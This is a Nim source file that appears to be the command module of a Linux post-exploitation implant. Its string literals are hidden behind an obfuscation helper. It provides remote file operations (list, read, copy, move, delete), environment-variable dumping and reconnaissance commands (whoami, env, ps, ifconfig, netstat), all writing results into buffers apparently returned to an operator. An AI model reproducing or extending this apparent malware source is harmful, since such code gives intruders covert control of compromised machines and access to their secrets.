from std/base64 import encode
import std/[algorithm, json, parseutils, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/linapi/handlers
import ../utils/linapi/utils
import execution

var prev = ""
var prevLen = 0

proc note(prefix, text: string; buf: var openArray[char]): int =
  # Writes a prefix and text into the buffer
  if prefix.len + text.len > buf.len: return -1
  if prefix.len > 0: copyMem(addr buf[0], unsafeAddr prefix[0], prefix.len)
  if text.len > 0: copyMem(addr buf[prefix.len], unsafeAddr text[0], text.len)
  prefix.len + text.len

proc arrow(a, b: string; buf: var openArray[char]): int =
  # Writes a source and destination pair into the buffer
  let sep = obf(" -> ")
  if a.len + sep.len + b.len > buf.len: return -1
  if a.len > 0: copyMem(addr buf[0], unsafeAddr a[0], a.len)
  for i, c in sep: buf[a.len + i] = c
  if b.len > 0: copyMem(addr buf[a.len + sep.len], unsafeAddr b[0], b.len)
  a.len + sep.len + b.len

proc joinPath(a, b: string): string =
  # Joins two path parts into one path
  if a.len == 0:
    b
  elif a[^1] == '/':
    a & b
  else:
    a & pathSep & b

proc parentPath(path: string): string =
  # Returns the parent directory of a path
  let p = path.strip(trailing = false)
  let i = p.rfind('/')
  if i <= 0:
    ""
  else:
    p[0 ..< i]

proc paramValue*(params: string; jsonKey: string; flags: openArray[string]): string =
  # Reads a parameter from json or from flags
  try:
    let p = parseJson(params)
    if p.hasKey(jsonKey):
      return p[jsonKey].getStr().strip(chars = {'"', '\''})
    if p.hasKey(obf("args")):
      let parts = p[obf("args")].getStr().splitWhitespace()
      var i = 0
      while i < parts.len:
        for flag in flags:
          if parts[i] == flag and i + 1 < parts.len:
            return parts[i + 1].strip(chars = {'"', '\''})
        inc i
  except JsonParsingError:
    discard
  ""

proc entrySize(path: string; isDir: bool): string =
  # Returns the formatted size of a file
  if isDir:
    return ""
  let sz = getPathSize(path)
  if sz < 0:
    return obf("?")
  var sizeBuf: array[16, char]
  let sn = fmtSize(sz.uint64, sizeBuf)
  if sn > 0:
    result = newString(sn)
    copyMem(addr result[0], addr sizeBuf[0], sn)
  else:
    result = obf("?")

proc entryLabel(name: string; isDir: bool): string =
  # Returns a short label for a directory entry
  if isDir:
    obf("dir")
  elif name.len > 0 and name[0] == '.':
    obf("hid")
  else:
    obf("file")

proc run_attrib*(args: string; buf: var openArray[char]): int =
  # Writes file mode attributes into the buffer
  if args.len == 0 or not pathExists(args):
    return -1
  let attrStr = getPathModeStr(args)
  if attrStr.len == 0:
    return -1
  if attrStr.len + 2 + args.len > buf.len:
    return -1
  copyMem(addr buf[0], unsafeAddr attrStr[0], attrStr.len)
  buf[attrStr.len] = ' '
  buf[attrStr.len + 1] = ' '
  copyMem(addr buf[attrStr.len + 2], unsafeAddr args[0], args.len)
  attrStr.len + 2 + args.len

proc stripLsFlags(raw: string): string =
  # Strips leading flags from an ls argument string
  result = raw.strip()
  while result.len > 0 and result[0] == '-':
    let sp = result.find(' ')
    if sp < 0:
      return ""
    result = result[sp + 1 .. ^1].strip()

proc run_ls*(args: string; buf: var openArray[char]): int =
  # Lists directory entries into the buffer
  var dir = stripLsFlags(args.strip())
  if dir.len == 0:
    dir = getCurrentDir()
  elif pathExists(dir) and not pathIsDir(dir):
    return run_attrib(dir, buf)
  if not pathIsDir(dir):
    return -1
  var entries = listDirEntries(dir)
  sort(entries, proc(a, b: DirEntry): int =
    # Compares two directory entry names
    cmp(a.name, b.name))
  var body: array[8192, char]
  var pos = 0
  var count = 0
  const dateW = 19
  const sizeW = 8
  const typeW = 4
  for ent in entries:
    if pos + 320 >= body.len:
      break
    let full = joinPath(dir, ent.name)
    let dateStr = formatPathMtime(full)
    let sizeStr = entrySize(full, ent.isDir)
    if not appendCol(body, pos, dateStr, dateW, false): break
    if not appendStr(body, pos, obf(" ")): break
    if not appendCol(body, pos, sizeStr, sizeW, true): break
    if not appendStr(body, pos, obf("  ")): break
    if not appendCol(body, pos, entryLabel(ent.name, ent.isDir), typeW, false): break
    if not appendStr(body, pos, obf("  ")): break
    if not appendStr(body, pos, ent.name): break
    if not appendByte(body, pos, '\n'): break
    inc count
  let hdr = obf("total ") & $count & obf("\n")
  if hdr.len + pos > buf.len: return -1
  copyMem(addr buf[0], unsafeAddr hdr[0], hdr.len)
  copyMem(addr buf[hdr.len], addr body[0], pos)
  hdr.len + pos

proc run_pwd*(buf: var openArray[char]): int =
  # Writes the current directory into the buffer
  let cur = getCurrentDir()
  if cur.len > buf.len: return -1
  if cur.len > 0: copyMem(addr buf[0], unsafeAddr cur[0], cur.len)
  cur.len

proc run_cd*(args: string; buf: var openArray[char]): int =
  # Changes the current directory
  if args.len == 0:
    return run_pwd(buf)
  if args.len == 1 and args[0] == '-':
    if prevLen == 0 or not setCurrentDir(prev):
      return -1
    return run_pwd(buf)
  let cur = getCurrentDir()
  prev = cur
  prevLen = cur.len
  if not setCurrentDir(args):
    return -1
  run_pwd(buf)

proc run_mkdir*(args: string; buf: var openArray[char]): int =
  # Creates a directory
  if args.len == 0 or not makeDir(args):
    return -1
  note(obf("created: "), args, buf)

proc run_rmdir*(args: string; buf: var openArray[char]): int =
  # Removes a directory
  if args.len == 0 or not removeDirPath(args):
    return -1
  note(obf("removed: "), args, buf)

proc run_del*(args: string; buf: var openArray[char]): int =
  # Deletes a path
  if args.len == 0 or not deletePath(args):
    return -1
  note(obf("deleted: "), args, buf)

proc run_copy*(args: string; buf: var openArray[char]): int =
  # Copies a path from source to destination
  let parts = args.splitWhitespace()
  if parts.len < 2:
    return -1
  let src = parts[0]
  let dst = parts[1]
  if not copyPath(src, dst):
    return -1
  arrow(src, dst, buf)

proc run_move*(args: string; buf: var openArray[char]): int =
  # Moves a path from source to destination
  let parts = args.splitWhitespace()
  if parts.len < 2:
    return -1
  let src = parts[0]
  let dst = parts[1]
  if not movePath(src, dst):
    return -1
  arrow(src, dst, buf)

proc run_ren*(args: string; buf: var openArray[char]): int =
  # Renames a path inside its parent directory
  let parts = args.splitWhitespace()
  if parts.len < 2:
    return -1
  let src = parts[0]
  let name = parts[1]
  let parent = parentPath(src)
  if parent.len == 0:
    return -1
  let fullStr = joinPath(parent, name)
  if not movePath(src, fullStr):
    return -1
  arrow(src, fullStr, buf)

proc run_cat*(args: string; buf: var openArray[char]): int =
  # Reads a file into the buffer
  if args.len == 0 or not pathExists(args):
    return -1
  readPathToBuf(args, buf)

proc run_echo*(args: string; buf: var openArray[char]): int =
  # Writes the argument or an env value into the buffer
  if args.len > 0 and args[0] == '$':
    let key = args[1 .. ^1].strip()
    if key.len == 0:
      return 0
    let val = envGetValue(key)
    if val.len > buf.len:
      return -1
    if val.len > 0:
      copyMem(addr buf[0], unsafeAddr val[0], val.len)
    return val.len
  if args.len > buf.len:
    return -1
  if args.len > 0:
    copyMem(addr buf[0], unsafeAddr args[0], args.len)
  args.len

proc run_set*(args: string; buf: var openArray[char]): int =
  # Lists env pairs or reads one env value
  if args.len == 0:
    var pos = 0
    for pair in envEnumerate():
      let line = pair[0] & '=' & pair[1] & '\n'
      if pos + line.len > buf.len:
        return pos
      if line.len > 0:
        copyMem(addr buf[pos], unsafeAddr line[0], line.len)
      pos += line.len
    return pos
  let val = envGetValue(args)
  if val.len == 0:
    let miss = obf("(not set)")
    if args.len + 1 + miss.len > buf.len:
      return -1
    if args.len > 0:
      copyMem(addr buf[0], unsafeAddr args[0], args.len)
    buf[args.len] = '='
    for i, c in miss:
      buf[args.len + 1 + i] = c
    return args.len + 1 + miss.len
  if args.len + 1 + val.len > buf.len:
    return -1
  if args.len > 0:
    copyMem(addr buf[0], unsafeAddr args[0], args.len)
  buf[args.len] = '='
  copyMem(addr buf[args.len + 1], unsafeAddr val[0], val.len)
  args.len + 1 + val.len

proc run_whoami*(args: string; buf: var openArray[char]): int =
  # Runs whoami and writes the result
  execPosix(obf("whoami"), args, buf)

proc run_env*(args: string; buf: var openArray[char]): int =
  # Runs env and writes the result
  execPosix(obf("env"), args, buf)

proc run_tasklist*(args: string; buf: var openArray[char]): int =
  # Lists running processes into the buffer
  let psArgs = if args.len > 0: args else: obf("-ef")
  execPosix(obf("ps"), psArgs, buf)

proc run_ifconfig*(args: string; buf: var openArray[char]): int =
  # Runs ifconfig and writes the result
  execPosix(obf("ifconfig"), args, buf)

proc run_netstat*(args: string; buf: var openArray[char]): int =
  # Runs netstat and writes the result
  execPosix(obf("netstat"), args, buf)
